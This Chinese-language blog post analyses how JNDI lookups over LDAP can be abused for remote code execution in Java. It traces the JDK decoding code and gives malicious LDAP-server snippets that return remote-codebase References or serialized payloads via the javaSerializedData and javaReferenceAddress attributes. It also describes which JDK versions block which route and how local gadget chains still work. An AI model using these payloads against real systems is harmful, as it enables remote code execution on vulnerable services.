
# JNDI with LDAP


                                阅读量   
                                **670355**
                            
                        |
                        
                                                                                                                                    ![](./img/201181/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/201181/t0125f83f55202607b1.jpg)](./img/201181/t0125f83f55202607b1.jpg)



## 0x00 前言

JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager，本文将讲述JNDI使用ldap协议的两个攻击面XD



## 0x01 LDAP基础

关于LDAP的介绍，延伸阅读一下[这篇](https://www.cnblogs.com/wilburxu/p/9174353.html)

> LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:
<p>● Using Java serialization<br>
o [https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html)<br>
● Using JNDI References<br>
o [https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html](https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html)</p>
from [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)

Java中的LDAP可以在属性值中存储相关的Java对象，可以存储如上两种对象，而相关的问题就是出现在这部分上。

后文用的LDAP Server参考的是[mbechler 实现的LDAPRefServer](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java)，连接的客户端Client直接用JNDI的lookup完成，jdk版本jdk8u162

```
Context ctx = new InitialContext();
ctx.lookup("ldap://127.0.0.1:1389/EvilObj");
ctx.close();
```



## 0x02 LDAP with JDNI References

JNDI发起ldap的lookup后，将有如下的调用流程，这里我们直接来关注，获得远程LDAP Server的Entry之后，Client这边是怎么做处理的

[![](./img/201181/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015c3147f82ab67df2.png)

跟进com/sun/jndi/ldap/Obj.java#decodeObject，按照该函数的注释来看，其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象，也可能是一个Reference对象。关于序列化对象的处理，我们看后面一节。这里摘取了Reference的处理方式：

```
static Object decodeObject(Attributes attrs)
    throws NamingException {
    Attribute attr;
    // Get codebase, which is used in all 3 cases.
    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));
    try {
        // ...
        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// "objectClass"
        if (attr != null &amp;&amp;
            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // "javaNamingReference"
                attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) { // "javanamingreference"
            return decodeReference(attrs, codebases);
        }
      //...
```

如果LDAP Server返回的属性里包括了`objectClass`和`javaNamingReference`，将进入Reference的处理函数decodeReference上

```
if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) {
    className = (String)attr.get();
} else {
    throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +
                " attribute is required");
}

if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) {
    factory = (String)attr.get();
}

Reference ref = new Reference(className, factory,
    (codebases != null? codebases[0] : null));
```

decodeReference再从属性中提取出`javaClassName`和`javaFactory`，最后将生成一个Reference。这里如果看过我前面的那篇[jndi-with-rmi](http://blog.0kami.cn/2020/02/09/jndi-with-rmi/)，可以看到其实这里生成的ref就是我们在RMI返回的那个ReferenceWrapper，后面这个ref将会传递给Naming Manager去处理，包括从codebase中获取class文件并载入。

而这里LDAP也类似，处理ref的对象是NamingManager的子类javax/naming/spi/DirectoryManager.java，因为跟RMI有点类似不具体分析了，最后同样由javax/naming/spi/NamingManager.java#getObjectFactoryFromReference来处理。

到这里，我们再来看mbechler 实现的LDAPRefServer就比较清楚了

[![](./img/201181/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013eca4ff483644b65.png)

当其获取到LDAP连接时，将填充如上的几个属性及其对应的值，就是为了满足上面的条件而生成一个Reference对象。



## 0x03 LDAP with Serialized Object

JNDI对于属性中的序列化数据的处理一共有两个地方，我们先来顺着前面的JNDI Reference的思路说下去

#### <a class="reference-link" name="%E7%AC%AC%E4%B8%80%E5%A4%84%EF%BC%9Acom/sun/jndi/ldap/Obj.java#decodeObject"></a>第一处：com/sun/jndi/ldap/Obj.java#decodeObject

在com/sun/jndi/ldap/Obj.java#decodeObject上还存在一个判断

```
if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {// “javaSerializedData”
    ClassLoader cl = helper.getURLClassLoader(codebases);
    return deserializeObject((byte[])attr.get(), cl);
}
```

如果在返回的属性中存在`javaSerializedData`，将继续调用`deserializeObject`函数，该函数主要就是调用常规的反序列化方式readObject对序列化数据进行还原，如下payload。

```
@Override
protected void processAttribute(Entry entry){
  entry.addAttribute("javaClassName", "foo");
  entry.addAttribute("javaSerializedData", serialized);
}
```

这里我们就不需要通过远程codebase的方式来达成RCE，当然首先本地环境上需要有反序列化利用链所依赖的库文件。

#### <a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E5%A4%84%EF%BC%9Acom/sun/jndi/ldap/Obj.java#decodeReference"></a>第二处：com/sun/jndi/ldap/Obj.java#decodeReference

`decodeReference`函数在对普通的Reference还原的基础上，还可以进一步对RefAddress做还原处理，其中还原过程中，也调用了`deserializeObject`函数，这意味着我们通过满足RefAddress的方式，也可以达到上面第一种的效果。

具体代码太长了，这里我就说一下条件：
1. 1.第一个字符为分隔符
1. 2.第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型
1. 3.第二个分隔符与第三个分隔符之间，表示type，类型
1. 4.第三个分隔符是双分隔符的形式，则进入反序列化的操作
1. 5.序列化数据用base64编码
满足上面的条件，构造一个类似的

```
protected void processAttribute(Entry entry){
  entry.addAttribute("javaClassName", "foo");
  entry.addAttribute("javaReferenceAddress","$1$String$$"+new BASE64Encoder().encode(serialized));
  entry.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
}
```

当然第二处只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。



## 0x04 后续

自[jdk8u191-b02](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33)版本后，新添加了`com.sun.jndi.ldap.object.trustURLCodebase`默认为false的限制，也就意味着远程codebase的Reference方式被限制死了，我们只能通过SerializedData的方法来达成利用。

我们来整理一下，关于jndi的相关安全更新

1.JDK 6u132, JDK 7u122, JDK 8u113中添加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false。

**导致jndi的rmi reference方式失效，但ldap的reference方式仍然可行**

2.Oracle JDK 11.0.1、8u191、7u201、6u211之后 `com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被调整为false。

**导致jndi的ldap reference方式失效，到这里为止，远程codebase的方式基本失效，除非人为设为true**

而在最新版的jdk8u上，jndi ldap的本地反序列化利用链[1](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l239)和[2](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l478)的方式仍然未失效，jndi rmi底层(JRMPListener)[StreamRemoteCall](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/sun/rmi/transport/StreamRemoteCall.java#l270)的本地利用方式仍未失效。

所以如果Reference的方式不行的时候，可以试试利用本地ClassPath里的反序列化利用链来达成RCE。



## 0x05 总结

JNDI和LDAP的结合，出现了2种利用方式，一是利用远程codebase的方式，二是利用本地ClassPath里的反序列化利用链。在最新版的jdk8u中，codebase的方式依赖`com.sun.jndi.ldap.object.trustURLCodebase`的值，而第二种方式仍未失效。

LDAP的使用方法除了JNDI的lookup，其他的库也会有相应的使用方法，如Spring的ldap，这里还可以继续深入下去，先挖个坑XD

最后，上面的两个ldap Server更新到了[github](https://github.com/wh1t3p1g/ysomap)上，自取XD
